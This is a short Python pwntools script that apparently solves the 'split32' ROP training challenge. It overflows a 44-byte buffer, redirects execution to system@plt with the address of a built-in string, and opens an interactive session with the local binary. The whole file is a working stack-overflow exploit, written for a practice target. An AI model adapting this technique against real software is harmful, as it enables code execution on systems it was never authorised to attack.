import os
from pwn import *

payload = 'A' * 44	# offset

elf = ELF('./split32')

payload += p32(elf.plt['system'])
payload += "RTRN"
payload += p32(elf.symbols['usefulString'])

r = process('./split32')

r.recvuntil('>')
r.sendline(payload)
r.interactive()
